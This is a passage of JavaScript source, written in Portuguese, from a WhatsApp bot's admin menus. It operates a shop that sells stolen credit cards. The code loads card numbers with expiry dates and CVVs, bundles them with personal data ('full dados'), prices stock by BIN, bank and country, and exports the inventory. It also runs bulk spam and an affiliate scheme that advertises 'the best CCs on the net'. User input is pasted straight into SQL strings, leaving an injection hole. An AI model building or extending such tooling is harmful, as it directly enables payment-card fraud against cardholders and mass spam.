            TENVIADO = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE RECEBEU_SPAM = 1`).all();
            TNAOENVIADO = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE RECEBEU_SPAM = 2`).all();
            TERROENVIADO = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE RECEBEU_SPAM = 3`).all();

            Texto = `🗣️ *MENU SPAM* 🗣️

┏━━━━━━━━━━━━━┓
*STATUS ATUAL:* ${Status_Ativado}
┗━━━━━━━━━━━━━┛

◎ ══════ ❈ ══════ ◎
*ESTATÍSTICAS DE ENVIO*
◎ ══════ ❈ ══════ ◎
*TOTAL DE USUÁRIOS QUE:*

Receberam a mensagem: ${TENVIADO.length}
Não receberam (Devido a algum erro): ${TERROENVIADO.length}
Falta enviar ainda: ${TNAOENVIADO.length}
┕━━━━╗✹╔━━━━┙

──────────────────────────────

◎ ══════ ❈ ══════ ◎
*ATIVAR OU DESATIAR SPAM*
◎ ══════ ❈ ══════ ◎
*Ativar*
/spamstatus===1

*Desativar*
/spamstatus===0 
┕━━━━╗✹╔━━━━┙

──────────────────────────────

◎ ══════ ❈ ══════ ◎
*TEXTO DA MENSAGEM*
◎ ══════ ❈ ══════ ◎

/spamtexto===FALA RAPAZIADA
┕━━━━╗✹╔━━━━┙

┎━─━─━─━─━─━─━─━─━┒
*TEXTO ATUAL*
┖━─━─━─━─━─━─━─━─━┚

${TEXTO_ENVIAR}

──────────────────────────────`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💼 ASSOCIADOS") > -1 || Mensagem_Texto.toString() === "/admasso" && Adms.includes(Numero)) {
            Texto = `💼 *ASSOCIADOS* 💼

👽 *_IDÉIA APERFEIÇOADA PELA MENTE ALIENÍGENA DE TRAMPOSO* 👽

◎ ══════ ❈ ══════ ◎
*ASSOCIADOS*
◎ ══════ ❈ ══════ ◎

(Ativa)
/ativarasso===1
(Desativa)
/ativarasso===0



◎ ══════ ❈ ══════ ◎
*POR PIX OU POR VENDA*
◎ ══════ ❈ ══════ ◎

*Percentual do associado em cima das compras do indicado ou em cima dos PIXs recarregados?*

PIX: /assopixoucompra===1
COMPRA: /assopixoucompra===2
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*RELATORIO DE ASSOCIADOS A PAGAR*
◎ ══════ ❈ ══════ ◎

*Menu mostrando nome, números e saldos*
*Ao escolher um, pagar o pix, entrar em contato e ver estatísticas*

/associadospagar
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR SALDO DE INDICAÇÃO DE UM ASSOCIADO*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/definirsaldoasso===5513996403793===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*PERCENTUAL SOBRE VENDA(GERAL)*
◎ ══════ ❈ ══════ ◎

*Percentual de lucro padrão que todos os associados vão receber por cada venda.*
/assopercentgeral===20
(20%)



◎ ══════ ❈ ══════ ◎
*PERCENTUAL SOBRE VENDA(User Específico)*
◎ ══════ ❈ ══════ ◎

*Percentual de lucro sobre venda de um associado específico.*
/assopercent===[NUMERO]===[PERCENTUAL]

/assopercent===${Numero_Suporte_Plan}===30
(30%)



◎ ══════ ❈ ══════ ◎
*BÔNUS INDICADO GANHA AO SER INDICADO*
◎ ══════ ❈ ══════ ◎

*Quando ele for indicado, receberá esse valor no saldo.*
/indicadoassobonus===8
(8 reais)



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO TORNE-SE UM ASSOCIADO*
◎ ══════ ❈ ══════ ◎

/textotornarasso===VEM SER MEU SÓCIO CAMBADA



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO QUANDO ACEITA SER ASSOCIADO*
◎ ══════ ❈ ══════ ◎

/textovirouasso===AGORA VOCÊ É UM ASSOCIADO!



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO DIVULGAÇÃO MODELO*
◎ ══════ ❈ ══════ ◎

(se usar isso aqui #LINK# o bot vai colocar o *Link* do associado no lugar.)
(se usar isso aqui #COD# o bot vai colocar o *Código* do associado no lugar.)

/textomodeloasso1===MELHORES CCS DA NET VEM COM O PAPAI
/textomodeloasso2===MELHORES CCS DA NET VEM COM O PAPAI`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("🔔 NOTIFICAÇÕES EM GRUPOS") > -1 || Mensagem_Texto.toString() === "/admnot" && Adms.includes(Numero)) {

            ELOGIAR = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'ELOGIAR'`).get()["VALOR"]
            if (ELOGIAR === "1") {
                ELOGIAR_ESTADO = "✅ATIVADO"
            } else {
                ELOGIAR_ESTADO = "❌DESATIVADO"
            }
            ATIVAR_NOTIFICACOES = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'ATIVAR_NOTIFICACOES'`).get()["VALOR"]
            if (ATIVAR_NOTIFICACOES === "1") {
                ATIVAR_NOTIFICACOES_ESTADO = "✅ATIVADO"
            } else {
                ATIVAR_NOTIFICACOES_ESTADO = "❌DESATIVADO"
            }
            NOT_REGISTRO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_REGISTRO'`).get()["VALOR"]
            if (NOT_REGISTRO === "1") {
                NOT_REGISTRO_ESTADO = "✅ATIVADO"
            } else {
                NOT_REGISTRO_ESTADO = "❌DESATIVADO"
            }
            NOT_ADD_SALDO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_ADD_SALDO'`).get()["VALOR"]
            if (NOT_ADD_SALDO === "1") {
                NOT_ADD_SALDO_ESTADO = "✅ATIVADO"
            } else {
                NOT_ADD_SALDO_ESTADO = "❌DESATIVADO"
            }
            NOT_RESGATAR_GIFT = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_RESGATAR_GIFT'`).get()["VALOR"]
            if (NOT_RESGATAR_GIFT === "1") {
                NOT_RESGATAR_GIFT_ESTADO = "✅ATIVADO"
            } else {
                NOT_RESGATAR_GIFT_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_CC = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CC'`).get()["VALOR"]
            if (NOT_COMPROU_CC === "1") {
                NOT_COMPROU_CC_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_CC_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_CC_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CC_MIX'`).get()["VALOR"]
            if (NOT_COMPROU_CC_MIX === "1") {
                NOT_COMPROU_CC_MIX_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_CC_MIX_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_CONSULTAVEL = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CONSULTAVEL'`).get()["VALOR"]
            if (NOT_COMPROU_CONSULTAVEL === "1") {
                NOT_COMPROU_CONSULTAVEL_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_CONSULTAVEL_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CONSULTADA'`).get()["VALOR"]
            if (NOT_COMPROU_CONSULTADA === "1") {
                NOT_COMPROU_CONSULTADA_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_CONSULTADA_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LOGIN'`).get()["VALOR"]
            if (NOT_COMPROU_LOGIN === "1") {
                NOT_COMPROU_LOGIN_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_LOGIN_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_LARA'`).get()["VALOR"]
            if (NOT_COMPROU_LARA === "1") {
                NOT_COMPROU_LARA_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_LARA_ESTADO = "❌DESATIVADO"
            }
            NOT_COMPROU_DOC = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_DOC'`).get()["VALOR"]
            if (NOT_COMPROU_DOC === "1") {
                NOT_COMPROU_DOC_ESTADO = "✅ATIVADO"
            } else {
                NOT_COMPROU_DOC_ESTADO = "❌DESATIVADO"
            }

            Texto = `🔔 *NOTIFICAÇÕES EM GRUPOS* 🔔

◎ ══════ ❈ ══════ ◎
*BOT ELOGIAR DONO NO GRUPO*
◎ ══════ ❈ ══════ ◎
(Toda vez que alguém marcar/mencionar você, o Bot vai soltar uma frase aleatória de elogio a ti.)

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${ELOGIAR} (${ELOGIAR_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR ELOGIOS*
/elogiar===1

*DESATIVAR ELOGIOS*
/elogiar===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ATIVAR TODAS AS NOTIFICAÇÕES*
◎ ══════ ❈ ══════ ◎
(Digamos que final de semana, quer uma pausa nas notificações, só desativar e reativar quando desejar, pois todas as configurações se manterão.)

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${ATIVAR_NOTIFICACOES} (${ATIVAR_NOTIFICACOES_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR TODAS AS NOTIF*
/ativarnotifgeral===1

*DESATIVAR TODAS AS NOTIF*
/ativarnotifgeral===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*COLOCAR GRUPO NA LISTA DE NOTIFICAÇÃO*
◎ ══════ ❈ ══════ ◎
(Esse comando deve ser utilizado no grupo, irá permitir que o bot notifique neste grupo, as situações configuradas.)

*ATIVAR NESTE GRUPO*
/notifiqueaqui===1

*DESATIVAR NESTE GRUPO*
/notifiqueaqui===0
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*INSERIR GRUPO NA LISTA DE NOTIFICAÇÃO PELO ID*
◎ ══════ ❈ ══════ ◎

/inserirgruponotificar===[ID]

/inserirgruponotificar===556218548-46854688468448@g.us
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR GRUPO NA LISTA DE NOTIFICAÇÃO PELO ID*
◎ ══════ ❈ ══════ ◎

/deletargruponotificar===[ID]

/deletargruponotificar===556218548-46854688468448@g.us
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ENVIAR MENSAGEM EM UM GRUPO USANDO O BOT*
◎ ══════ ❈ ══════ ◎

/msn===[ID]===[MENSAGEM]

/msn===556218548-46854688468448@g.us===OLÁ TROPINHA DO JOÃOZIN
┕━━━━╗✹╔━━━━┙


┏━━━━━━━━━━━━━┓
*SITUAÇÕES A NOTIFICAR*
┗━━━━━━━━━━━━━┛


◎ ══════ ❈ ══════ ◎
*NOTIFICAR SALDO ADICIONADO*
◎ ══════ ❈ ══════ ◎
(Quando um cliente adicionar saldo via PIX.)

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_ADD_SALDO} (${NOT_ADD_SALDO_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfpix===1

*DESATIVAR*
/ntfpix===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR USUÁRIO NOVO*
◎ ══════ ❈ ══════ ◎
(Quando um novo usuário interage com o Bot / Se registra.)

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_REGISTRO} (${NOT_REGISTRO_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfregistro===1

*DESATIVAR*
/ntfregistro===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR GIFT RESGATADO*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_RESGATAR_GIFT} (${NOT_RESGATAR_GIFT_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfgift===1

*DESATIVAR*
/ntfgift===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU CC*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_CC} (${NOT_COMPROU_CC_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuycc===1

*DESATIVAR*
/ntfbuycc===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU CC PCT MIX*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_CC_MIX} (${NOT_COMPROU_CC_MIX_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuyccmix===1

*DESATIVAR*
/ntfbuyccmix===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU CONSULTAVEL*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_CONSULTAVEL} (${NOT_COMPROU_CONSULTAVEL_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuyconsutavel===1

*DESATIVAR*
/ntfbuyconsutavel===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU CONSULTADA*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_CONSULTADA} (${NOT_COMPROU_CONSULTADA_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuyconsutada===1

*DESATIVAR*
/ntfbuyconsutada===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU LOGIN*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_LOGIN} (${NOT_COMPROU_LOGIN_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuylogin===1

*DESATIVAR*
/ntfbuylogin===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU LARA*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_LARA} (${NOT_COMPROU_LARA_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuylara===1

*DESATIVAR*
/ntfbuylara===0
┕━━━━╗✹╔━━━━┙


◎ ══════ ❈ ══════ ◎
*NOTIFICAR COMPROU DOCs*
◎ ══════ ❈ ══════ ◎

╭┉┉┅┄┄┈ • ┈┄┄┅┉┉╮
🔄*ESTADO ATUAL:* ${NOT_COMPROU_DOC} (${NOT_COMPROU_DOC_ESTADO})
╰┉┉┅┄┄┈ • ┈┄┄┅┉┉╯

*ATIVAR*
/ntfbuydoc===1

*DESATIVAR*
/ntfbuydoc===0
┕━━━━╗✹╔━━━━┙`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💳 AJUSTES - CCs") > -1 || Mensagem_Texto.toString() === "/admcc" && Adms.includes(Numero)) {

            Texto = `*💳CCS💳*

◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO MENU CCS*
◎ ══════ ❈ ══════ ◎
(Local bom para colocar sua Tabela)

/textomenucc===BEM VINDO AO MENU DE CCS!
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR TEXTO AO COMPRAR CC*
◎ ══════ ❈ ══════ ◎
(Isso vai no final da mensagem que entregará a CC comprada)

/textocomproucc===OBRIGADO POR COMPRAR MEU MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*OPÇÕES DE COMO VENDER CCs POR UNIDADE*
◎ ══════ ❈ ══════ ◎

*VENDER CCS POR UNIDADE*
Sim: /venderunidadecc===1
Não: /venderunidadecc===0

*VENDER INFO CC*
(CCs sem dados ou com dados qualquer)
(Se não abastecer com dados o próprio Bot coloca um Nome e CPF qualquer.)
Sim: /venderinfocc===1
Não: /venderinfocc===0

*VENDER CC FULL DADOS*
Sim: /venderccfull===1
Não: /venderccfull===0

*MODO DE VENDA DE CC POR UNIDADE*
Simples: /modevendaunidade===1
Detalhado: /modevendaunidade===2



◎ ══════ ❈ ══════ ◎
*ABASTECER CCs*
◎ ══════ ❈ ══════ ◎

*ABASTECENDO SÓ CCS*

/addcc===NUMERO|MES|ANO|CVV

/addcc===5502090000000000|09|29|050
5362690000000000|08|28|837
4282670000000000|04|24|443
5090650000000000|01|27|635
5405930000000000|10|28|532
4763320000000000|10|25|766
4576010000000000|08|26|404
┕━━━━╗✹╔━━━━┙


*ABASTECENDO CC COM DADOS A MAIS*

/addcc===NUMERO|MES|ANO|CVV|DADOS

/addcc===5502099047387752|09|29|050|BLA BLA BLA BLA
5362690000000000|08|28|837|cpf nome bla bla
4282670000000000|04|24|443|ping pong bla blum
5090650000000000|01|27|635|BLA BLA BLA BLA
5405930000000000|10|28|532|BLA BLA BLA BLA
4763320000000000|10|25|766|BLA BLA BLA BLA
4576010000000000|08|26|404|BLA BLA BLA BLA
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*VER TABELAS DE CCs REGISTRADAS*
◎ ══════ ❈ ══════ ◎

*COMANDOS*
/vertabelabandeira
/vertabelabandeirafull
/vertabelanivel
/vertabelanivelfull
/vertabelabanco
/vertabelabancofull
/vertabelapais
/vertabelapaisfull
/vertabelabin
/vertabelabinfull
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DELETAR TODAS AS INFORMAÇÕES DE BINS*
◎ ══════ ❈ ══════ ◎
(Tudo que foi registrado ao abastecer CCs será deletado.)
(Comando só funcionará, caso não tenha nenhuma CC disponível no estoque.)
(Como todas as informações serão deletas, os preços que você definiu também vão.)

/delinfosbin
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR PREÇOS*
◎ ══════ ❈ ══════ ◎

(Primeiro veja as tabelas com os comandos acima.)

(Número do meio é o ID na lista)
(Número no final é o novo preço)

(ATENÇÃO: Se colocar preço sem ser nos niveis, os valores serão somados)
(Exemplo: Colcou Bandeira Amex a 30, só que a CC Nivel Platinum de 10 reais é Amex, então 10+30 = 40)

*EXEMPLOS DOS COMANDOS*
/valorccnivel===1===10
/valorccnivelfull===1===10
/valorccbanco===1===10
/valorccbancofull===1===10
/valorccbandeira===1===10
/valorccbandeirafull===1===10
/valorccpais===1===10
/valorccpaisfull===1===10
/valorccbin===1===10
/valorccbinfull===1===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*ALTERAR PREÇOS DE TODAS AS CCS DE UMA VEZ*
◎ ══════ ❈ ══════ ◎

*EXEMPLOS DOS COMANDOS*
/allvalorccnivel===10
/allvalorccnivelfull===10
/allvalorccbanco===10
/allvalorccbancofull===10
/allvalorccbandeira===10
/allvalorccbandeirafull===10
/allvalorccpais===10
/allvalorccpaisfull===10
/allvalorccbin===10
/allvalorccbinfull===10
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*BAIXE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueccs
/baixarestoqueccsfull (Full Dados)
┕━━━━╗✹╔━━━━┙
irá baixar no formato:
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS - DADOS(Que você colocou)*



◎ ══════ ❈ ══════ ◎
*BAIXE TODAS AS CCS DIE DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueccsdie
/baixarestoqueccsdiefull (Full Dados)
┕━━━━╗✹╔━━━━┙
irá baixar no formato:
*NUMER|MES|ANO|CVV - BANDEIRA - TIPO - NIVEL - BANCO - PAIS - DADOS(Que você colocou)*



◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueccs
/deletarestoqueccsfull (Full Dados)
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
